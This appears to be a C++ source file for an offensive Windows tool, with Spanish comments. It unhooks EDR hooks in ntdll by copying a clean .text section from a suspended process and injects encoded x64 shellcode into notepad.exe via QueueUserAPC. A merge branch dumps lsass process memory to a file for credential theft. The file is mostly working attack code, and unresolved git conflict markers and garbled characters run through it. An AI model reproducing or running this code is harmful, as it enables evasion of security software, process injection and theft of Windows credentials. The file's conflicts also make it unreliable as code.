#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <iostream>
#include <limits>
#include "Source.h"
#include <psapi.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include "privilege.h"

#pragma comment(lib, "dbghelp.lib")


#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
using namespace std;

int filter(unsigned int code)
{
	/*Spaguetti code for debugging purpose*/
	return EXCEPTION_EXECUTE_HANDLER;
}

BOOL unhook(wchar_t* processName);


void inject()
{


	unsigned char buf[] =
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\xc6\x66\x95\x3c\x6d\xa0\xf0\x4e\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x3a\x2e\x16\xd8\x9d\x48"
		"\x30\x4e\xc6\x66\xd4\x6d\x2c\xf0\xa2\x1f\x90\x2e\xa4\xee\x08"
		"\xe8\x7b\x1c\xa6\x2e\x1e\x6e\x75\xe8\x7b\x1c\xe6\x2e\x1e\x4e"
		"\x3d\xe8\xff\xf9\x8c\x2c\xd8\x0d\xa4\xe8\xc1\x8e\x6a\x5a\xf4"
		"\x40\x6f\x8c\xd0\x0f\x07\xaf\x98\x7d\x6c\x61\x12\xa3\x94\x27"
		"\xc4\x74\xe6\xf2\xd0\xc5\x84\x5a\xdd\x3d\xbd\x2b\x70\xc6\xc6"
		"\x66\x95\x74\xe8\x60\x84\x29\x8e\x67\x45\x6c\xe6\xe8\xe8\x0a"
		"\x4d\x26\xb5\x75\x6c\x70\x13\x18\x8e\x99\x5c\x7d\xe6\x94\x78"
		"\x06\xc7\xb0\xd8\x0d\xa4\xe8\xc1\x8e\x6a\x27\x54\xf5\x60\xe1"
		"\xf1\x8f\xfe\x86\xe0\xcd\x21\xa3\xbc\x6a\xce\x23\xac\xed\x18"
		"\x78\xa8\x0a\x4d\x26\xb1\x75\x6c\x70\x96\x0f\x4d\x6a\xdd\x78"
		"\xe6\xe0\xec\x07\xc7\xb6\xd4\xb7\x69\x28\xb8\x4f\x16\x27\xcd"
		"\x7d\x35\xfe\xa9\x14\x87\x3e\xd4\x65\x2c\xfa\xb8\xcd\x2a\x46"
		"\xd4\x6e\x92\x40\xa8\x0f\x9f\x3c\xdd\xb7\x7f\x49\xa7\xb1\x39"
		"\x99\xc8\x74\xd7\xa1\xf0\x4e\xc6\x66\x95\x3c\x6d\xe8\x7d\xc3"
		"\xc7\x67\x95\x3c\x2c\x1a\xc1\xc5\xa9\xe1\x6a\xe9\xd6\x50\x45"
		"\xec\x90\x27\x2f\x9a\xf8\x1d\x6d\xb1\x13\x2e\x16\xf8\x45\x9c"
		"\xf6\x32\xcc\xe6\x6e\xdc\x18\xa5\x4b\x09\xd5\x14\xfa\x56\x6d"
		"\xf9\xb1\xc7\x1c\x99\x40\x5f\x0c\xcc\x93\x60\xa3\x1e\xf0\x3c"
		"\x6d\xa0\xf0\x4e";
	; /*x64 Calc.exe Shellcode*/


		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
		HANDLE victimProcess = NULL;
		PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
		THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
		std::vector<DWORD> threadIds;
		SIZE_T shellSize = sizeof(buf);
		HANDLE threadHandle = NULL;

		if (Process32First(snapshot, &processEntry)) {
			while (_wcsicmp(processEntry.szExeFile, L"notepad.exe") != 0) {
				Process32Next(snapshot, &processEntry);
			}
		}

		victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
		LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
		WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);

		if (Thread32First(snapshot, &threadEntry)) {
			do {
				if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
					threadIds.push_back(threadEntry.th32ThreadID);
				}
			} while (Thread32Next(snapshot, &threadEntry));
		}

		for (DWORD threadId : threadIds) {
			threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
			QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
			Sleep(1000 * 2);
		}

		return;
	
}

int wmain(int argc, wchar_t** argv)
{
	/*Usage: unhook.exe <path_of_exe_to_create_suspended> */
	if (argc < 2)
	{
<<<<<<< HEAD
		printf("Usage: %S <path_of_exe_to_create_suspended>", argv[0]);
=======
>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
		return -1;
	}
	else
	{
<<<<<<< HEAD
		if (!unhook(argv[1])) /*If unhook not succedded*/
			return 0;
	}

	inject(); /*Injector QueueUserAPC Poc Thanks Ired.team!!*/
	
=======
		if (wcstoul(argv[1], NULL, 10) != 0) //Si el parametro primero es un numero intentamos dumpear directamente
			goto dumpea;
		if (!unhook(argv[1])) //Si no es un numero pues deshookeamos y luego dumpeamos
			return 0;
	}

dumpea:
	if (argc == 3)
		pId = wcstoul(argv[2], NULL, 10);
	else
	{
		printf("No teastemos lsass\n");
		return 0;
	}
	printf("Testeando lsass\n");
	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pId);
	HANDLE outFile = CreateFile(L"C:\\Temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, pId, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if (isDumped)
		printf("Dumped yeah\n");
>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
	return 1;


}



BOOL unhook(wchar_t* processName)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	__try
	{

		BOOL hProcbool = CreateProcess(NULL, processName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);  /*
		Creamos un proceso suspendido que luego usaremos para leer su memoria y borrar los hooks de nuestro proceso*/

		HANDLE hProc = pi.hProcess;
		if (hProc == NULL)
		{
			printf("Error: %d\n", GetLastError());
			return 0;
		}

		PEB pPeb;
		PROCESS_BASIC_INFORMATION BasicInfo;

		DWORD dwSize = NULL;

		HMODULE hLibrary = GetModuleHandleW(L"ntdll.dll");
		if (NULL == hLibrary)
			return 0;
		HANDLE process = GetCurrentProcess();
		MODULEINFO mi2 = {};
		GetModuleInformation(process, hLibrary, &mi2, sizeof(mi2));
		FARPROC fpNtQueryInformationProcess = GetProcAddress
		(
			hLibrary,
			"NtQueryInformationProcess"
		);

		if (!fpNtQueryInformationProcess)
			return 0;

		_NtQueryInformationProcess ntQueryInformationProcess =
			(_NtQueryInformationProcess)fpNtQueryInformationProcess;
		/*Information del proceso suspendido para sacar la direccion del PEB*/
		NTSTATUS status = (*ntQueryInformationProcess)(hProc, 0, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwSize);

		if (!NT_SUCCESS(status))
		{
			printf("Error: %d\n", GetLastError());
			return 0;
		}
		unsigned long long baseAddress = (unsigned long long)BasicInfo.PebBaseAddress;
		SIZE_T bytesRead;
		/*Leo el PEB*/
		BOOL bSuccess = ReadProcessMemory(hProc, (LPCVOID)baseAddress, &pPeb, sizeof(PEB), &bytesRead);
		if (!bSuccess)
		{
			printf("Error: %d\n", GetLastError());
			throw EXCEPTION_STACK_OVERFLOW;
		}
		/*Con el PEB me quedo con el address de la base de la imagen*/
		LPVOID imageBase = pPeb.ImageBaseAddress;
		DWORD old;
		VirtualProtect(imageBase, sizeof(LPVOID), PAGE_READWRITE, &old);

		MEMORY_BASIC_INFORMATION basic;
		/*Me guardo el addr para luego poder iterar sobre el*/
		LPVOID addr = imageBase;
		char* buffer = new char[100];
		int contador = 1;
		/*Enumeramos las secciones del proceso*/
		while (VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION)))
		{
			LPVOID oldaddr = addr;
			if (basic.State == MEM_COMMIT && basic.Type == MEM_IMAGE) /*Si una seccion es de tipo imagen*/
			{
				delete[] buffer;
				buffer = new char[basic.RegionSize];
				/*Leemos la memoria de esa seccion*/
				bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
				if (!bSuccess)
				{
					printf("Error: %d\n", GetLastError());

					return 0;
				}
				for (unsigned int j = 0; j < bytesRead; j++)
				{
					/*Hay algun tramo de memoria con bytes magic de PE32*/
					if (buffer[j] == 'M' && buffer[j + 1] == 'Z' && buffer[j + 3] == '\0' && buffer[j + 79] == 'h')
					{

						/*
<<<<<<< HEAD
						Si es el primer match es el propip PE del ejecutable, solo me guardo la direccion
						para saltar al final de esa direccion y ahorrarme leerlo entero
=======
						Si es el primer match es el propip PE del ejecutable, solo me guardo la direcciï¿½n
						para saltar al final de esa direcciï¿½n y ahorrarme leerlo entero
>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
						*/
						if (contador == 1)
						{
							if (j != 0)
								addr = LPVOID((unsigned long long)addr + j);
							if (j != 0)
								bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
							if (!bSuccess)
							{
								printf("Error final one: %d\n", GetLastError());
								return 0;
							}
							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((unsigned long long)buffer + pDOSHeader->e_lfanew);
<<<<<<< HEAD
							/*Ahi ese donde saco el tamano del PE32 para luego saltarmelo*/
=======
							/*Ahi ese donde saco el tamaï¿½o del PE32 para luego saltarmelo*/
>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
							addr = LPVOID((unsigned long long)addr + ntHeader->OptionalHeader.SizeOfImage);
							contador += 1;
							goto continuar;
						}
						/*Si es el segundo match es NTDLL.dll*/
						else
						{
							/*Si no fuese la primera posicion del iterador de la seccion, pues me reemplazo addr
							por addr mas iterador*/
							if (j != 0)
								addr = LPVOID((unsigned long long)addr + j);
							if (j != 0)
								bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
							if (!bSuccess)
							{
								printf("Error final one: %d\n", GetLastError());
								return 0;
							}
							//printf("Found ntdll image in: 0x%x.\n", (LPVOID)((unsigned long long)basic.BaseAddress + j));
							/*Operaciones con las estructuras PE32 para sacar el numero de secciones de la DLL y donde empieza
							en si la DLL y dicha seccion*/
							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
							PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((unsigned long long)buffer + pDOSHeader->e_lfanew);


							for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) //iteramos las secciones
							{
								//Sacamos el nombre de cada seccion
								PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
								//Si es la seccion text estamos de suerte
								if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
								{
<<<<<<< HEAD
									//Guardamos el tamano de la seccion text
=======
									//Guardamos el tamaï¿½o de la seccion text
>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
									unsigned long long size_section = hookedSectionHeader->Misc.VirtualSize;
									//Guardamos el addr de la seccion text (coincide con el addr de mi propia seccion text de mi dll, gracias microsoft!!
									unsigned long long hookedAddr = hookedSectionHeader->VirtualAddress;
									addr = LPVOID((unsigned long long)addr + hookedSectionHeader->VirtualAddress);
<<<<<<< HEAD
									//Comprobamos el tamano de memoria que podemos leer de ahi, para que no de por saco
=======
									//Comprobamos el tamaï¿½o de memoria que podemos leer de ahï¿½, para que no de por saco
>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
									VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION));
									delete[] buffer;

#ifdef _M_X64 
<<<<<<< HEAD
									/*Ese numero es por tema de padding, sino anade byte nulls al final que no hacen falta*/
=======

>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
									buffer = new char[basic.RegionSize - 2000];
									/*Leemos la seccion text de la dll del proceso suspendido*/
									bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize - 2000, &bytesRead);
									if (!bSuccess)
									{
										printf("Error reading the last: %d\n", GetLastError());
										return 0;
									}
									//Por motivos de debug si quieres puedes dumpearla ;) 
									/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
									fwrite(buffer, bytesRead, 1, fp);
									fclose(fp);*/
<<<<<<< HEAD

=======
							
>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
									DWORD oldProtection, oldProtection2 = 0;
									/*
									Cambiamos el protect de esa zona para darnos permisos de escritura, y luego
									finalmente escribimos la DLL que habiamos leido antes en el proceso suspendido en
									mi DLL hookeada por el EDR*/
<<<<<<< HEAD
									
=======

>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
									bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, PAGE_EXECUTE_READWRITE, &oldProtection);

									/*¡¡Thanks to ired.team i didn´t lost my mind trying to calculate that address!!*/
									/*https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++*/


									memcpy((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), buffer, basic.RegionSize - 2000);
									isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, oldProtection, &oldProtection2);
#else
									buffer = new char[basic.RegionSize];

									bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
									if (!bSuccess)
									{
										printf("Error reading the last: %d\n", GetLastError());
										return 0;
									}
									/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
									fwrite(buffer, bytesRead, 1, fp);
									fclose(fp);*/
									DWORD oldProtection, oldProtection2 = 0;
									bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtection);
									memcpy((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), buffer, basic.RegionSize);
									isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize, oldProtection, &oldProtection2);

#endif
									printf("Found section text\n");

									//Limpiamos

									delete[] buffer;
									return 1;
								}
							}
							printf("Sacamos la header\n");
						}

						contador += 1;
					}
				}

			}
		continuar:
			/*En el primer match del iterador (primera cabecera PE encontrada) hemos reemplazado el addr, asi que noo nos hace falta sumarle nada mas,
			por eso comprobamos si oldaddr == actual_addr, para saber si hace falta iterarlo o no*/
			if ((unsigned long long)oldaddr == (long long)addr)
				addr = LPVOID((unsigned long long)addr + (unsigned long long)basic.RegionSize);

		}
	}
	__except (filter(GetExceptionCode())) /*Evitamos posibles overflows XD*/
	{
		std::cout << "Error convirtiendo datos\n";
		return 0;
	}


<<<<<<< HEAD
}
=======
}

>>>>>>> 013650e0a85074ce46b411050c68d91781df5fec
